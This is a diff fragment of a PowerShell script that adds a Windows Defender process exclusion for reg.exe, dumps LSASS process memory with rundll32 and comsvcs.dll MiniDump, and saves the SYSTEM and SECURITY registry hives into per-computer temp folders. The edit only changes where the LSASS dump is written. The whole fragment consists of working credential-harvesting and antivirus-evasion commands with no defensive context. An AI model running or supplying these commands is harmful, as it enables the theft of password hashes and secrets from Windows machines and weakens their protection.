@@ -23,7 +23,7 @@ Add-MpPreference -ExclusionProcess "C:\Windows\System32\reg.exe"
 # C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $(Get-Process lsass | select -ExpandProperty Id) C:\Windows\Temp\${computername}\debug.log
 
 $lsass_pid = Get-Process lsass | select -ExpandProperty Id
-rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass_pid C:\Windows\Temp\lsass.dmp
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass_pid C:\Windows\Temp\${computername}\lsass.dmp
 
 reg SAVE HKLM\SYSTEM C:\Windows\Temp\${computername}\\SYSTEM.reg
 reg SAVE HKLM\SECURITY C:\Windows\Temp\${computername}\SECURITY.reg
